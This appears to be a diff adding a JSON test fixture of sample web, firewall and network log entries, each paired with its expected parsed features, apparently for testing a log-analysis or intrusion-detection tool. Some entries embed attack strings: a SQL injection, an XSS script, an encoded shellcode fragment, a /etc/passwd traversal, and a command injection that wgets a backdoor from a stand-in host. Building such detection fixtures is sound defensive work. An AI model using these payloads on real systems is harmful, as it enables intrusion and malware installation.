@@ -1,0 +1,267 @@
+{
+  "apache_common_logs": [
+    {
+      "description": "Normal GET request",
+      "expected_features": {
+        "http_methods": [
+          "GET"
+        ],
+        "ip_addresses": [
+          "192.168.1.100"
+        ],
+        "log_format": "apache_common",
+        "status_codes": [
+          200
+        ]
+      },
+      "log_entry": "192.168.1.100 - - [23/Jan/2024:10:47:32 +0000] \"GET /index.html HTTP/1.1\" 200 2326"
+    },
+    {
+      "description": "POST login request",
+      "expected_features": {
+        "http_methods": [
+          "POST"
+        ],
+        "ip_addresses": [
+          "10.0.0.15"
+        ],
+        "log_format": "apache_common",
+        "status_codes": [
+          302
+        ]
+      },
+      "log_entry": "10.0.0.15 - - [23/Jan/2024:10:48:17 +0000] \"POST /login.php HTTP/1.1\" 302 0"
+    },
+    {
+      "description": "SQL injection attempt",
+      "expected_features": {
+        "attack_indicators": [
+          "sql_injection"
+        ],
+        "http_methods": [
+          "GET"
+        ],
+        "ip_addresses": [
+          "203.0.113.45"
+        ],
+        "log_format": "apache_common",
+        "status_codes": [
+          500
+        ]
+      },
+      "log_entry": "203.0.113.45 - - [23/Jan/2024:11:15:42 +0000] \"GET /admin/config.php?id=1' OR 1=1-- HTTP/1.1\" 500 1234"
+    },
+    {
+      "description": "XSS attempt",
+      "expected_features": {
+        "attack_indicators": [
+          "xss"
+        ],
+        "http_methods": [
+          "GET"
+        ],
+        "ip_addresses": [
+          "198.51.100.22"
+        ],
+        "log_format": "apache_common",
+        "status_codes": [
+          200
+        ]
+      },
+      "log_entry": "198.51.100.22 - - [23/Jan/2024:11:20:33 +0000] \"GET /search.php?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1\" 200 856"
+    }
+  ],
+  "attack_samples": [
+    {
+      "description": "Command injection with malware download",
+      "expected_features": {
+        "attack_indicators": [
+          "command_injection"
+        ]
+      },
+      "log_entry": "192.168.1.99 - - [23/Jan/2024:18:30:15 +0000] \"GET /cmd.exe?cmd=wget+http://malware.example.com/backdoor.exe HTTP/1.1\" 200 5432"
+    },
+    {
+      "description": "Failed login attempt - potential brute force",
+      "expected_features": {
+        "attack_indicators": [
+          "brute_force"
+        ]
+      },
+      "log_entry": "203.0.113.44 - - [23/Jan/2024:19:15:42 +0000] \"POST /login HTTP/1.1\" 401 156"
+    },
+    {
+      "description": "Shellcode injection attempt",
+      "expected_features": {
+        "attack_indicators": [
+          "shellcode"
+        ]
+      },
+      "log_entry": "198.51.100.88 - - [23/Jan/2024:20:22:33 +0000] \"GET /app?data=%90%90%90%90%31%c0%50%68%2f%2f%73%68 HTTP/1.1\" 500 0"
+    }
+  ],
+  "complex_logs": [
+    {
+      "description": "Complex log with timing information",
+      "expected_features": {
+        "http_methods": [
+          "POST"
+        ],
+        "ip_addresses": [
+          "10.0.0.100"
+        ],
+        "log_format": "apache_common",
+        "status_codes": [
+          200
+        ]
+      },
+      "log_entry": "10.0.0.100 - admin [24/Jan/2024:08:15:30 +0000] \"POST /admin/users.php HTTP/1.1\" 200 2048 \"https://admin.example.com/dashboard\" \"Mozilla/5.0 (compatible; AdminBot/1.0)\" \"-\" rt=0.123 uct=\"0.045\" uht=\"0.078\" urt=\"0.000\""
+    }
+  ],
+  "connection_logs": [
+    {
+      "description": "HTTP connection",
+      "expected_features": {
+        "destination_ip": "10.0.0.50",
+        "destination_port": 80,
+        "identified_services": [
+          "http"
+        ],
+        "source_ip": "192.168.1.100",
+        "source_port": 3456
+      },
+      "log_entry": "2024-01-23 15:45:22 Connection established: 192.168.1.100:3456 -> 10.0.0.50:80"
+    },
+    {
+      "description": "RDP connection attempt",
+      "expected_features": {
+        "attack_indicators": [
+          "high_risk_port_access"
+        ],
+        "destination_ip": "192.168.1.200",
+        "destination_port": 3389,
+        "source_ip": "198.51.100.75",
+        "source_port": 12345
+      },
+      "log_entry": "2024-01-23 16:12:08 Suspicious activity: 198.51.100.75:12345 -> 192.168.1.200:3389"
+    }
+  ],
+  "firewall_logs": [
+    {
+      "description": "Blocked SSH connection attempt",
+      "expected_features": {
+        "identified_services": [
+          "ssh"
+        ],
+        "ip_addresses": [
+          "203.0.113.100",
+          "192.168.1.10"
+        ],
+        "log_format": "firewall",
+        "ports": [
+          45234,
+          22
+        ],
+        "protocols": [
+          "TCP"
+        ]
+      },
+      "log_entry": "Jan 23 14:22:18 fw1 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:1b:21:8b:47:81:00:15:c5:4a:16:5a:08:00 SRC=203.0.113.100 DST=192.168.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=64 ID=12345 PROTO=TCP SPT=45234 DPT=22 WINDOW=1024 RES=0x00 SYN URGP=0"
+    },
+    {
+      "description": "Allowed DNS query",
+      "expected_features": {
+        "identified_services": [
+          "dns"
+        ],
+        "ip_addresses": [
+          "192.168.1.5",
+          "8.8.8.8"
+        ],
+        "log_format": "firewall",
+        "ports": [
+          53241,
+          53
+        ],
+        "protocols": [
+          "UDP"
+        ]
+      },
+      "log_entry": "Jan 23 14:25:33 fw1 kernel: [UFW ALLOW] IN=eth0 OUT= SRC=192.168.1.5 DST=8.8.8.8 PROTO=UDP SPT=53241 DPT=53"
+    }
+  ],
+  "nginx_logs": [
+    {
+      "description": "Normal API request",
+      "expected_features": {
+        "http_methods": [
+          "GET"
+        ],
+        "ip_addresses": [
+          "192.168.1.50"
+        ],
+        "log_format": "nginx",
+        "status_codes": [
+          200
+        ],
+        "urls": [
+          "https://example.com"
+        ]
+      },
+      "log_entry": "192.168.1.50 - - [23/Jan/2024:12:30:45 +0000] \"GET /api/users HTTP/1.1\" 200 1024 \"https://example.com\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\""
+    },
+    {
+      "description": "Directory traversal attempt",
+      "expected_features": {
+        "attack_indicators": [
+          "directory_traversal"
+        ],
+        "http_methods": [
+          "GET"
+        ],
+        "ip_addresses": [
+          "172.16.0.33"
+        ],
+        "log_format": "nginx",
+        "status_codes": [
+          404
+        ]
+      },
+      "log_entry": "172.16.0.33 - - [23/Jan/2024:12:35:12 +0000] \"GET /../../etc/passwd HTTP/1.1\" 404 162 \"-\" \"wget/1.14 (linux-gnu)\""
+    }
+  ],
+  "unsw_nb15_style": [
+    {
+      "description": "UNSW-NB15 style normal traffic",
+      "expected_features": {
+        "destination_ip": "149.171.126.18",
+        "destination_port": 80,
+        "identified_services": [
+          "http"
+        ],
+        "protocols": [
+          "tcp"
+        ],
+        "source_ip": "192.168.1.5",
+        "source_port": 3372
+      },
+      "log_entry": "1 tcp 192.168.1.5:3372 -> 149.171.126.18:80 - - - SA_RA 0 0 0 0 0 0 0 0 0 0 0 0 0 0 normal 0"
+    },
+    {
+      "description": "UNSW-NB15 style reconnaissance attack",
+      "expected_features": {
+        "destination_ip": "192.168.1.10",
+        "destination_port": 22,
+        "identified_services": [
+          "ssh"
+        ],
+        "protocols": [
+          "tcp"
+        ],
+        "source_ip": "198.51.100.25",
+        "source_port": 1234
+      },
+      "log_entry": "2 tcp 198.51.100.25:1234 -> 192.168.1.10:22 - - - SA 0 0 0 0 0 0 0 0 0 0 0 0 0 0 reconnaissance 1"
+    }
+  ]
+}
